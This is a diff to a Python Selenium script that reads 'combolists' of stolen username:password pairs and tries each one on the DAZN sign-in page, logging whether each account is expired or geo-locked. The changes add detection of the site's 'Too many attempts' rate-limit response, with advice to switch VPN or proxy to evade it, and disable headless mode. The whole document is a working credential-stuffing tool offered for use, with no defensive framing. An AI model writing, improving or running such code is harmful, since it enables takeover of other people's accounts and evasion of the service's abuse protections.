@@ -13,6 +13,7 @@ from pathlib import Path
 
 def dazn():
     title()
+    attempts = 0
     file_directory = str(Path(__file__).parents[1]) + '/combolists/dazn'
     page = 'https://www.dazn.com/en-GB/signin'
     plain_directory = str(Path(__file__).parents[1])
@@ -21,7 +22,7 @@ def dazn():
     browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
                                  'Chrome/103.0.5060.134 ''Safari/537.36')
     browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
-    browser_options.add_argument('--headless=new')
+    #browser_options.add_argument('--headless=new')
     splitter = ComboSplitter(file_directory, "dazn")
     try:
         users, passwords = splitter.split_file()
@@ -56,7 +57,13 @@ def dazn():
                 password_input_box.send_keys(passwords[index])
                 sign_in_button.click()
                 time.sleep(7)
-
+                if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div'):
+                    four_two_nine = browser.find_element(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div').text
+                    if 'Too many attempts' in four_two_nine:
+                        print(" | {}:{} ---> 429 - Too many attempts\nPlease change your VPN/Proxy and try again."
+                              .format(users[index], passwords[index]))
+                        print("Ending.")
+                        exit()
                 if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div[2]/div/section/header/h1'):
                     print(" | {}:{} ---> Expired Account".format(users[index], passwords[index]))
                     error_flag = True
@@ -69,7 +76,7 @@ def dazn():
                     print(' | {}:{} ---> Geo-locked login'.format(users[index], passwords[index]))
                     account_results.write('{}:{} ---> Geo-locked login'.format(users[index], passwords[index]))
 
-                elif browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):
+                if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):
                     expired_account_text = browser.find_element(By.XPATH,
                                                                 '//*[@id="root"]/div/div[2]/div/div/div/div['
                                                                 '2]/div/span/div').text
